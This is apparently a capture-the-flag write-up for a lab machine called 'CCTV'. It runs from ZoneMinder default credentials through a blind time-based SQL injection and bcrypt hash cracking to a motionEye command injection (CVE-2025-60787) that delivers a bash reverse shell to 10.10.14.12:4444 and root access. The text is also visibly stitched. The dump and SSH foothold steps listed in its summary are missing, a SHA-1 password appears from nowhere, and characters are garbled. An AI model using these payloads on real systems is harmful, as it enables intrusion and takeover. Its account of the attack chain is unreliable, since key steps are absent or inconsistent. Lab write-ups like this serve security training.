CCTV

Easy

Linux (Ubuntu 24.04)

Exploited ZoneMinder with default credentials, blind time-based SQL injection to dump bcrypt hashes, cracked user password for SSH foothold, then leveraged CVE-2025-60787 in motionEye for root via command injection in image_file_name config.

Vulnerabilities
CVE-2025-60787 SQL Injection Hash Cracking
Tools Used
nmap sqlmap hashcat Burp Suite

Summary

  • Discovered ZoneMinder v1.37.63 on port 80 with default admin:admin credentials, granting full access to the CCTV management dashboard.
  • Identified a blind time-based SQL injection in the filter[Query][terms][0][attr] parameter via Burp Suite, confirmed with conditional SLEEP() payloads.
  • Used sqlmap to dump the zm.Monitor table, extracting bcrypt password hashes for the superadmin, mark, and admin accounts.
  • Cracked mark's bcrypt hash ($2y$12$...) using hashcat mode -m 3200 with rockyou.txt, revealing the password opensesame for SSH access.
  • Escalated to root by discovering an internal motionEye service running on port 8765 as root, forwarding it via SSH, and exploiting CVE-2025-60787 command injection in the image_file_name configuration parameter.

Port Scan

Started with a full TCP port scan followed by a targeted service/version scan on discovered ports.

$ nmap -sC -sV -p- --min-rate 5000 10.10.11.60

Only two open ports — SSH and HTTP. The web server is the primary attack surface. Let's enumerate further.

Web Enumeration

Visiting http://10.10.11.60 in the browser returned a 301 redirect to http://cctv.htb. Added the hostname to /etc/hosts:

$ echo "10.10.11.60 cctv.htb" | sudo tee -a /etc/hosts

Browsing to http://cctv.htb revealed a ZoneMinder v1.37.63 login page — an open-source CCTV/video surveillance application.

ZoneMinder - Video Surveillance System
Version: 1.37.63

ZoneMinder is a well-known application with a history of vulnerabilities. The version is identifiable from the login page footer and HTTP response headers.

ZoneMinder Default Credentials

ZoneMinder ships with default credentials out of the box. Tried the standard admin:admin combination:

Username: admin
Password: admin

Login successful. We now have full access to the ZoneMinder dashboard, including the ability to view monitors, events, and system configuration. The dashboard showed several configured camera monitors and their associated events.

With authenticated access, the next step is to look for deeper vulnerabilities — SQL injection, file upload, or configuration disclosure that could lead to credential extraction.

Blind SQL Injection

Confirming the Injection

Intercepted a request in Burp Suite while browsing the ZoneMinder dashboard and noticed the filter[Query][terms][0][attr] parameter being sent in the request body. Tested for SQL injection by injecting a conditional time delay:

$ curl -s -o /dev/null -w "%{time_total}" \
  "http://cctv.htb/zm/index.php?view=events" \
  -d 'filter[Query][terms][0][attr]=Id&filter[Query][terms][0][op]=%3D&filter[Query][terms][0][val]=1 AND (SELECT SLEEP(5))&action=filter' \
  -b "ZMSESSID=...; zmUser=admin"

12.847    # Request took ~13 seconds тЖТ injection confirmed

The response was delayed by ~13 seconds (5 second sleep + network overhead), confirming a blind time-based SQL injection in the filter parameter.

$ hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

Forwarded the internal motionEye port to our local machine:

$ ssh -L 8765:127.0.0.1:8765 mark@cctv.htb

Now http://localhost:8765 on our attack machine serves the motionEye web interface.

motionEye Login

Navigated to http://localhost:8765 in the browser and was presented with the motionEye login page. Used the SHA-1 hash itself as the password (a known behavior in certain motionEye versions where the raw hash is accepted as the password):

Username: admin
Password: 989c5a8ee87a0e9521ec81a79187d162109282f0

Login successful. We now have full admin access to the motionEye dashboard, which is running as root.

CVE-2025-60787 — Command Injection

motionEye is vulnerable to CVE-2025-60787, an authenticated command injection via the image_file_name configuration parameter. This parameter is used in a template string that gets passed to a shell command when generating snapshot filenames, allowing arbitrary command execution.

Step 1 — Set Up Netcat Listener

$ nc -lvnp 4444
listening on [any] 4444 ...

Step 2 — Bypass configUiValid

motionEye's web UI has a client-side validation function configUiValid() that restricts characters in certain config fields. To bypass this, intercept the POST request in Burp Suite and modify the image_file_name parameter directly in the request body, bypassing the JavaScript validation.

# In Burp Suite тАФ intercept the config save request and modify:
image_file_name=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.12%2F4444%200%3E%261%27%29

Decoded payload:

image_file_name=$(bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1')

Step 3 — Inject Reverse Shell into image_file_name

Triggered the payload by navigating to the camera snapshot endpoint, which processes the image_file_name template and executes our injected command. Alternatively, saved the camera configuration with the injected payload in the image_file_name field via a direct POST request:

POST /config/main_camera/set/ HTTP/1.1
Host: localhost:8765
Cookie: motioneye_cctv_admin="... Cookie value ..."

image_file_name=$(bash -c 'bash -i >& /dev/tcp/10.10.14.12/4444 0>&1')

Step 4 — Root Shell Received

$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.11.60] 49234
bash: cannot set terminal process group (1204): Inappropriate ioctl for device

root@cctv:/# id
uid=0(root) gid=0(root) groups=0(root)

root@cctv:/# cat /root/root.txt

Got a root shell. The command injection in the image_file_name parameter executed as root since the motionEye service runs with root privileges.

Key Takeaways

  • Always try default credentials first — ZoneMinder ships with admin:admin enabled, providing immediate authenticated access and a larger attack surface.
  • Authenticated SQL injection is still deadly — Even with a low-privilege web account, the filter parameter in ZoneMinder v1.37.63 is vulnerable to blind time-based SQLi, allowing full database extraction.
  • Bcrypt hashes are crackable with weak passwords — Despite using bcrypt with cost factor 12, mark's password opensesame fell to a dictionary attack in seconds. Strong passwords matter regardless of hashing algorithm.
  • Internal services are critical privesc paths — The motionEye service running on localhost:8765 as root was the key to privilege escalation. Always enumerate local services with ss -tlnp.
  • SSH port forwarding unlocks internal attack surfaces — Tunneling local ports through SSH is essential for accessing services bound to 127.0.0.1.
  • CVE-2025-60787 shows template injection severity — When user-controlled input flows into a filename template that's processed by a shell command, it's game over — especially when the service runs as root. Validate and sanitize all user inputs, especially those used in command templates.
